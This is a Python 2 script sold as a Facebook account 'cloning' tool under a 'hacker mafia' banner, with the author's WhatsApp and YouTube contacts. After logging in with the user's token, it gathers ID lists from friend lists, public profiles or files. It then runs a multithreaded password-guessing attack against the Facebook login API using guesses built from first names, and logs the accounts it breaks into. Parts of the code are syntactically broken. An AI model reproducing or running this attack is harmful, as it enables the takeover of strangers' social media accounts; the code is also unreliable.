#!/usr/bin/python2

#coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib

from multiprocessing.pool import ThreadPool

try:

    import requests

except ImportError:

    os.system('pip2 install requests')

try:

    import mechanize

except ImportError:

    os.system('pip2 install mechanize')

    os.system('python2 B4.py')

from requests.exceptions import ConnectionError

from mechanize import Browser

#### browser ####

reload(sys)

sys.setdefaultencoding('utf8')

br = mechanize.Browser()

br.set_handle_robots(False)

br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

#### colours ####

B='\033[1;94m'

R='\033[1;91m'

G='\033[1;92m'

W='\033[1;97m'

S='\033[1;96m'

P='\033[1;95m'

Y='\033[1;93m'

#### exit ####

def exb():

	print (R + 'Exit')	os.sys.exit()

#### clear ####

def cb():

    os.system('clear')

#### time sleep ####

def t():

    time.sleep(1)

def t1():

    time.sleep(0.01)

#### print std ####

def psb(z):

	for e in z + '\n':

		sys.stdout.write(e)

		sys.stdout.flush()

		t1()

#### token remove ####

def trb():

    os.system('rm -rf token.txt')

##### LOGO #####

MR.

PERFECT

HACKER OF THE MAFIA

HACKING IS NOT CRIME ITS A GAME AGAINST OF THE SYSTEM

πππππππππππππππππππππππππππππππππππππππππππππβββββ²ββββ

\033[1;94m βββββPerfectβββββββββββ\033[1;91mββββββββββPerfectβββββ

\033[1;94m βββββββ±β²ββββββββ

\033[1;94m βββββ²βββββ±ββββ\033[1;94mPerfect.\033[1;91mβββββ²βββββ±ββββ

\033[1;96m ββββββ²βββ±βββββββββββ\033[1;91mβββββββββββ²βββ±βββββ

\033[1;96m β±βββββββββββββ²βββββββ²

\033[1;96m................\033[1;93mPerfect\033[1;91m...............

\033[1;96m................\033[1;93mβ¬π΅π°π²π΄π±πΎπΎπΊβββββββββββββββββββββββββββββββββββββββββββββ

\033[1;91mβ Auther     : Mr.

Perfect

\033[1;92mβ WhatsApp   : +8801982423672

\033[1;95mβ YouTube    : https://youtube.com/channel/UCXItn4AnlxExhW0virHuD3Q

-HACKING IS NOT CRIME ITS AGAME AGAINST OF THE SYSTEM~β

\033[1;93mβββββββββββββββββββββββββββββββββββββββββββββ

                                '''

back=0

perfect-ok=[]

chek- cp-=[]

ok=[]

cp=[]

id=[]

#### login ####

def login():

	cb()

	try:

		tb=open('token.txt', 'r')

		menu() 

	except (KeyError,IOError):

		cb()

		print (logo)

		print (R + 'ββββββ·' + S + ' Login With β¬π΅π°π²π΄π±πΎπΎπΊβ¬ ' + R + 'ββββββ')

		print

		id=raw_input(S + '[β] ' + S + 'Email: ' + G +'')

		pwd=getpass.getpass(S + '[β‘] ' + R + 'Password : ')

		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pwd)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")

		z=json.load(data)

		if 'access_token' in z:

		    st = open("token.txt", "w")

		    st.write(z["access_token"])

		    st.close()

		    print (S + '[β]' + Y + ' Login successfull 100% β')

		    os.system('xdg-open https://youtube.com/channel/UCXItn4AnlxExhW0virHuD3Q')

		    menu()

		else:

		    if "www.facebook.com" in z["error_msg"]:

		        print (R + 'Account has a checkpoint !')

		        t()

		        login()

		    else:

		        print (R + 'number/user id/ password is wrong !')

		        trb()

		        t()

		        login()

def menu():

	cb()

	try:

		tb=open('token.txt','r').read()

	except IOError:

		print (R + 'Token Invalid !')

		trb()

		t()

		login()

	try:

		otw=requests.get('https://graph.facebook.com/me?access_token='+tb)

		a=json.loads(otw.text)

	except KeyError:

		print (G + 'Account has a checkpoint !')

		trb()

		t()

		login()

	except requests.exceptions.ConnectionError:

		print (W + 'No internet connection !')

		t()

		exb()

	cb()

	print (logo)

	print (S + '[β] ' + G + 'ID Name: ' + R + a['name'])

	print (S + '[β] ' + G + 'User ID: ' + R + a['id'])

	print

	print (S + 50*'-')

	print

	print (S + '[' + P + 'β1' + S + ']' + S + ' Fast Cloning New Update')

	print (S + '[' + P + 'β2' + S + ']' + S + ' Update BSF-52_perfect Tool')

	print (S + '[' + P + 'β3' + S + ']' + S + ' _BSF-52 ')

	print (S + '[' + Y + 'β4' + S + ']' + G + ' Log Out')

	print (S + '[' + Y + 'β0' + S + ']' + R + ' Exit')

	print

	print (S + 50*'-')

	print

	mb()

def mb():

	bm=raw_input(W + ' β¬π΅π°π²π΄π±πΎπΎπΊβ¬   ')

	if bm =='':

		print (R + 'Select a valid option !')

		mb()

	elif bm =='1':

		pak()

	elif bm =='2':

	    os.system('rm -rf $HOME/B4_BALOCH')

	    os.system('cd $HOME && git clone https://github.com/perfect.git')

	    cb()

	    print (logo)

	    psb('β10%')

	    psb('ββ20%')

	    psb('βββ30%')

	    psb('ββββ40%')

	    psb('βββββ50%')

	    psb('ββββββ60%')

	    psb('βββββββ70%')

	    psb('ββββββββ80%')

	    psb('βββββββββ90%')

	    psb('ββββββββββ100%')

	    psb('Frends login new Accountβ')

	    psb('WhatsApp Num +8801982423672β')

	    psb('WellCome To Mr.

Perfect')

	    psb('Congratulations Perfect Tool Has Been Updated Successfully')

	    psb('πUser Nameβ Mr

β')

	    psb('πPassword βPerfect β')

	    psb('Subscrib My Youtube Channel .//..........β')

	    psb('Please Login Again')

	    time.sleep(2)

	    os.system('cd $HOME/PerfectHacker && python2 perfect.py')

	elif bm =='3':

	    os.system('xdg-open https://chat.whatsapp.com/')

	    menu()

	elif bm =='4':

		psb('Token Has Been Removed')

		trb()

		t()

		exb()

	elif bm =='0':

	    exb()

	else:

		print (R+'Fill in correctly !')

		mb()

def pak():

	global tb

	try:

		tb=open('token.txt','r').read()

	except IOError:

		print (R + ' Invalid Token !')

		trb()

		t()

		login()

	cb()

	print (logo)

	print (S + '[' + P + 'β1' + S + ']' + P + ' Clone With Friend List')

	print (S + '[' + P + 'β2' + S + ']' + P + ' Clone From Public Account')

	print (S + '[' + Y + 'β3' + S + ']' + Y + ' Clone From File')

	print (S + '[' + R + 'β0' + S + ']' + R + ' Back')

	print

	print (S + 50*'-')

	print

	pb()

def pb():

	bp=raw_input(W + ' β¬π΅π°π²π΄π±πΎπΎπΊβ¬   ')

	if bp =='':

		print (R + 'Select a valid option !')

		pb()

	elif bp =='1':

		cb()

		print (logo)

		r=requests.get('https://graph.facebook.com/me/friends?access_token='+tb)

		z=json.loads(r.text)

		for s in z['data']:

			id.append(s['id'])

	elif bp=='2':

		cb()

		print (logo)

		idt=raw_input(S + '[β] ' + G + 'Put Public User ID/User Name: ' + W + '')

		cb()

		print (logo)

		try:

			jok=requests.get('https://graph.facebook.com/'+idt+'?access_token='+tb)

			op=json.loads(jok.text)

			psb(S + '[β]' + G + ' Account  Name: ' + W + op['name'])

		except KeyError:

			print (R + ' ID not found !')

			raw_input(R + ' Back')

			pak()

		r=requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+tb)

		z=json.loads(r.text)

		for i in z['data']:

			id.append(i['id'])

	elif bp =='3':

		cb()

		print (logo)

		try:

			idlist=raw_input(S + '[β] ' + R + 'Enter File Path: ' + G + '')

			for line in open(idlist,'r').readlines():

				id.append(line.strip())

		except IOError:

			print (R + ' File Not Fount !')

			raw_input(R + ' Back')

			pak()

	elif bp =='0':

		menu()

	else:

		print (R + ' Select a valid option !')

		pb()

	print (S + '[β]' + P + ' Total Friends: ' + W + str(len(id)))

	psb(S + '[β]' + S + ' To stop process  click on CTRL ~ Z')

	print

	print (S + 50*'-')

	print

	def main(arg):

		global cps, oks

		user=arg

		try:

			h=requests.get('https://graph.facebook.com/'+user+'/?access_token='+tb)

			j=json.loads(h.text)

			ps1=('786786')

			dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps1)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')

			k=json.load(dt)

			if 'www.facebook.com' in k['error_msg']:

			    print(S+'[CP] β‘ '+user+' β‘ '+ps1)

			    cps.append(user+ps1)

			else:

			    if 'access_token' in k:

			        print (G+'[OK] β‘ '+user+' β‘ '+ps1)

			        oks.append(user+ps1)

			    else:

			        ps2=(j['first_name']+'123')

			        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps2)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')

			        k=json.load(dt)

			        if 'www.facebook.com' in k['error_msg']:

			            print(S+'[CP] β‘ '+user+' β‘ '+ps2)

			            cps.append(user+ps2)

			        else:

			            if 'access_token' in k:

			                print(G+'[OK] β‘ '+user+' β‘ '+ps2)

			                oks.append(user+ps2)

			            else:

			                ps3=(j['first_name']+'786')

			                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps3)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')

			                k=json.load(dt)

			                if 'www.facebook.com' in k['error_msg']:

			                    print(S+'[CP] β‘ '+user+' β‘ '+ps3)

			                    cps.append(user+ps3)

			                else:

			                    if 'access_token' in k:

			                        print(G+'[OK] β‘ '+user+' β‘ '+ps3)

			                        oks.append(user+ps3)

			                    else:

			                        ps4=(j['first_name']+'12345')

			                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps4)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')

			                        k=json.load(dt)

			                        if 'www.facebook.com' in k['error_msg']:

			                            print(S+'[CP] β‘ '+user+' β‘ '+ps4)

			                            cps.append(user+ps4)

			                        else:

			                            if 'access_token' in k:

			                                print(G+'[OK] β‘ '+user+' β‘ '+ps4)

			                                oks.append(user+ps4)

			                            else:

			                                ps5=('Pakistan')

			                                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps5)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')

			                                k=json.load(dt)

			                                if 'www.facebook.com' in k['error_msg']:

			                                    print(S+'[CP] β‘ '+user+' β‘ '+ps5)

			                                    cps.append(user+ps5)

			                                else:

			                                    if 'access_token' in k:

			                                        print(G+'[OK] β‘ '+user+' β‘ '+ps5)

			                                        oks.append(user+ps5)

			                                    else:

			                                        ps6=(j['first_name']+'khan')

			                                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps6)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')

			                                        k=json.load(dt)

			                                        if 'www.facebook.com' in k['error_msg']:

			                                            print(S+'[CP] β‘ '+user+' β‘ '+ps6)

			                                            cps.append(user+ps6)

			                                        else:

			                                            if 'access_token' in k:

			                                                print(G+'[OK] β‘ '+user+' β‘ '+ps6)

			                                                oks.append(user+ps6)

		except:

			pass

	p=ThreadPool(30)

	p.map(main, id)

	print

	print(S+50*'-')

	print

	print(S+'Process has been completed CP ID Open After 7-8 Days ')

	print(Y+'Total '+G+'OK'+S+'/'+P+'CP'+S+' = '+G+str(len(oks))+S+'/'+R+str(len(cps)))

	print(S+'BlackMafia')     

	print

	raw_input(R + 'Back')

	os.system('python2 perfect.py')

if __name__=='__main__':

    login()
